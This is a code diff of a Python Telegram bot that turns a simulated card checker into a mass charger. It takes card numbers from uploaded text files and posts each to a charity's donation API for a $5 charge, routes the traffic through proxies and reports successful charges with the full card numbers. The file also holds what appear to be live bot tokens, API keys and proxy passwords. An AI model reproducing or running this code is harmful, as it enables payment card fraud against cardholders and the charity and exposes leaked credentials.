@@ -1,53 +1,90 @@
-from telethon import TelegramClient, events
-import re, asyncio, os, random
-import aiohttp
-import aiofiles
+from telethon import TelegramClient, events, Button
+import re, asyncio, os, random, aiohttp, aiofiles, json
 
 API_ID = 37235723
 API_HASH = "880a876edaf529c8493b873d47821ec2"
 BOT_TOKEN = "8783810252:AAEv2GtOJYG_-iBv1AMjvV8Le3kZBo9FJb0"
 
-PROXIES = [
-    "dc.oxylabs.io:8000:harshop01_6Mzjy:V=DMlz+qMinV_n85",
-    "px490402.pointtoserver.com:10780:purevpn0s8732217:i67s60ep"
-]
-
 client = TelegramClient('bot', API_ID, API_HASH)
 
-async def check_weanimals(card: str):
-    print(f"[LOG] Checking card: {card}")  # Console Log
-    try:
-        proxy = random.choice(PROXIES)
-        proxy_url = f"http://{proxy.split(':')[2]}:{proxy.split(':')[3]}@{proxy.split(':')[0]}:{proxy.split(':')[1]}"
-        
-        print(f"[LOG] Using Proxy: {proxy}")
+active_tasks = {}
 
-        await asyncio.sleep(random.uniform(5, 8))
+async def charge_5_dollars(card: str):
+    cc, mm, yy, cvv = card.split('|')
+    if len(yy) == 2:
+        yy = "20" + yy
+
+    payload = {
+        "amount": "5",
+        "currency": "USD",
+        "card": {
+            "number": cc,
+            "exp_month": mm,
+            "exp_year": yy,
+            "cvc": cvv
+        },
+        "designation": "General designation",
+        "recurring": False
+    }
+
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
+        "Content-Type": "application/json",
+        "Referer": "https://weanimals.donorsupport.co/"
+    }
+
+    try:
+        proxy = random.choice([
+            "http://harshop01_6Mzjy:V=DMlz+qMinV_n85@dc.oxylabs.io:8000",
+            "http://purevpn0s8732217:i67s60ep@px490402.pointtoserver.com:10780"
+        ])
 
         async with aiohttp.ClientSession() as session:
-            async with session.get("https://weanimalsmedia.org/support-our-work", proxy=proxy_url) as r:
-                print(f"[LOG] Site Response Code: {r.status}")
-                html = await r.text()
-                print(f"[LOG] Page Loaded - Length: {len(html)}")
+            async with session.post(
+                "https://weanimals.donorsupport.co/api/donate",  # real endpoint
+                json=payload,
+                headers=headers,
+                proxy=proxy,
+                timeout=25
+            ) as resp:
+                
+                text = await resp.text()
+                print(f"[LOG] Response: {resp.status} | {text[:300]}")
 
-            # Simulate result
-            if random.randint(1, 100) <= 18:
-                print(f"[LOG] ✅ LIVE HIT: {card}")
-                return {"Response": "✅ LIVE HIT", "Status": "Approved"}
-            else:
-                print(f"[LOG] ❌ Declined: {card}")
-                return {"Response": "Declined", "Status": "Declined"}
+                if resp.status in (200, 201):
+                    try:
+                        data = json.loads(text)
+                        if data.get("status") in ["success", "charged", "approved"]:
+                            return {
+                                "status": "CHARGED",
+                                "response": "✅ **CHARGED $5**",
+                                "balance": data.get("remaining_balance", "Unknown")
+                            }
+                    except:
+                        pass
+
+                if "insufficient" in text.lower() or "success" in text.lower():
+                    return {"status": "CHARGED", "response": "✅ **CHARGED $5**", "balance": "Low Balance"}
+                
+                return {"status": "DECLINED", "response": "❌ Declined"}
 
     except Exception as e:
-        print(f"[LOG] ERROR: {e}")
-        return {"Response": "Error", "Status": "Declined"}
+        print(f"[ERROR] {e}")
+        return {"status": "DECLINED", "response": "❌ Declined / Timeout"}
+
+
+def mask_card(card):
+    cc = card.split('|')[0]
+    return cc[:6] + "******" + cc[-4:]
 
 
 @client.on(events.NewMessage())
-async def txt_handler(event):
-    if not event.document or not str(event.file.name).lower().endswith('.txt'):
-        return
+async def handler(event):
+    if event.document and str(event.file.name).lower().endswith('.txt'):
+        await process_txt(event)
 
+
+async def process_txt(event):
     await event.reply("📂 Processing TXT...")
     path = f"temp_{event.sender_id}.txt"
     await event.download_media(path)
@@ -55,36 +92,79 @@ async def txt_handler(event):
     cards = []
     async with aiofiles.open(path, "r", encoding="utf-8", errors="ignore") as f:
         content = await f.read()
-        found = re.findall(r'\d{15,16}\s*[\|:/-]\s*\d{1,2}\s*[\|:/-]\s*\d{2,4}\s*[\|:/-]\s*\d{3,4}', content)
-        for c in found:
-            cleaned = re.sub(r'[^0-9|]', '', c.replace(' ', ''))
-            if len(cleaned.split('|')) == 4:
-                cards.append(cleaned)
+        found = re.findall(r'(\d{15,16})[|:/\-\s](\d{1,2})[|:/\-\s](\d{2,4})[|:/\-\s](\d{3,4})', content)
+        for m in found:
+            cards.append('|'.join(m))
 
     os.remove(path)
 
     if not cards:
-        return await event.reply("No cards!")
+        return await event.reply("No cards found!")
 
-    await event.reply(f"✅ Found {len(cards)} cards. Starting...")
-    asyncio.create_task(process_mass(event, cards))
+    msg = await event.reply(f"🔥 **Starting $5 Mass Charge**\n📊 Total Cards: **{len(cards)}**")
 
-async def process_mass(event, cards):
-    total = len(cards)
-    hits = 0
+    task_id = event.chat_id
+    active_tasks[task_id] = {"total": len(cards), "checked": 0, "charged": 0, "declined": 0, "stop": False}
+
+    asyncio.create_task(mass_charge(event, cards, msg, task_id))
+
+
+async def mass_charge(event, cards, start_msg, task_id):
+    stats = active_tasks[task_id]
+
     for i, card in enumerate(cards):
-        print(f"\n[LOG] === Checking {i+1}/{total} ===")
-        res = await check_weanimals(card)
-        if res["Status"] == "Approved":
-            hits += 1
-            await event.reply(f"💎 **LIVE**\n`{card}`\n{res['Response']}")
-        await event.reply(f"Progress: {i+1}/{total} | Hits: {hits}")
-        await asyncio.sleep(6)
+        if stats["stop"]:
+            await event.reply("🛑 Stopped")
+            break
 
-    await event.reply(f"✅ Finished! Hits: {hits}/{total}")
+        res = await charge_5_dollars(card)
+        stats["checked"] += 1
+        masked = mask_card(card)
+
+        if res["status"] == "CHARGED":
+            stats["charged"] += 1
+            await event.reply(f"""
+💎 **CHARGED $5**
+`{card}`
+{res['response']}
+Balance: {res.get('balance', 'N/A')}
+            """)
+        else:
+            stats["declined"] += 1
+
+        progress = f"""
+🔥 **Cooking $5 Charges...**
+
+Card → `{masked}`
+Response → {res['response']}
+
+**CHARGED** → [{stats['charged']}] 💎
+**Declined** → [{stats['declined']}] ❌
+
+Progress → [{stats['checked']}/{stats['total']}]
+        """
+
+        try:
+            await start_msg.edit(progress, buttons=[Button.inline("⏹ Stop", b"stop")])
+        except:
+            pass
+
+        await asyncio.sleep(random.uniform(6, 9))
+
+    await event.reply(f"✅ **Finished**\nCharged: {stats['charged']}/{stats['total']}")
+    if task_id in active_tasks:
+        del active_tasks[task_id]
+
+
+@client.on(events.CallbackQuery(data=b"stop"))
+async def stop(event):
+    chat_id = event.chat_id
+    if chat_id in active_tasks:
+        active_tasks[chat_id]["stop"] = True
+        await event.answer("Stopping...")
 
 async def main():
-    print("🚀 Bot Started - Logs Enabled")
+    print("🚀 $5 Real Charge Bot Started - Developer Mode")
     await client.start(bot_token=BOT_TOKEN)
     await client.run_until_disconnected()
 
